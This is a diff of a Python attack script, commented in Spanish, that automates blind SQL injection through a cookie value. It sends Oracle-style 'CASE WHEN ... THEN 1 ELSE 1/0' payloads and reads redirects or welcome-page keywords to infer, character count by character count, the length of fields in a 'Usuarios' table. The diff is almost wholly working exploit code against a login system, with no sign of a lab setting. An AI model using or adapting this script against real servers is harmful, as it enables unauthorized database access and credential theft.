@@ -34,19 +34,25 @@ def enviar_inyeccion(payload):
     Envía la inyección al servidor y devuelve True si se detecta un error, False en caso contrario.
     """
     data = {
-        "username": "admin",
-        "password": payload
+        "cookie_value": payload
     }
+    session = requests.Session()  # Usar una sesión para mantener el estado
     try:
-        response = requests.post(SERVER_URL, json=data, timeout=5)
+        response = requests.post(SERVER_URL, json=data, timeout=5, allow_redirects=True)
         print(colored(f"[*] Enviando inyección: {payload}", "cyan"))
         print(colored(f"[*] Estado de la respuesta: {response.status_code}", "cyan"))
         print(colored(f"[*] Longitud de la respuesta: {len(response.text)}", "cyan"))
+        # Opcional: Imprimir la respuesta completa
+        # print(response.text)
 
+        # Verificar si la redirección fue exitosa y si estamos en la URL esperada
+        if response.url.endswith("/welcome"):
+            print(colored("[+] Redirigido exitosamente a /welcome", "green"))
+            return True
 
-        # Lista de palabras clave que indican un error de división por cero
-        error_keywords = ["division by zero", "syntax error", "internal server error", "pg_error", "división por cero", "error de sintaxis", "cero"]
-        for keyword in error_keywords:
+        # Lista de palabras clave que indican un cambio en la web
+        success_keywords = ["Bienvenido", "bienvenido", "Welcome", "Dashboard", "Panel de control", "Panel de administración"]
+        for keyword in success_keywords:
             if keyword.lower() in response.text.lower():
                 return True
         return False
@@ -63,8 +69,8 @@ def obtener_longitud(campo, max_length=100):
     print(colored(f"\n[+] Determinando la longitud de '{campo}'...", "yellow"))
     for longitud in range(1, max_length + 1):
         # Construir el payload para verificar si LENGTH(campo) = longitud
-        # ' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1/0 ELSE 1 END FROM Usuarios WHERE ROWNUM=1) = 1 --'
-        payload = f"' AND (SELECT CASE WHEN (LENGTH({campo}) = {longitud}) THEN 1/0 ELSE 1 END FROM Usuarios WHERE ROWNUM=1) = 1 --"
+        # d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 1/0 END FROM Usuarios WHERE ROWNUM=1) = 1 --
+        payload = f"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH({campo}) = {longitud}) THEN 1 ELSE 1/0 END FROM Usuarios WHERE ROWNUM=1) = 1 --"
         if enviar_inyeccion(payload):
             print(colored(f"[*] La longitud de '{campo}' es: {longitud}", "green", attrs=["bold"]))
             return longitud
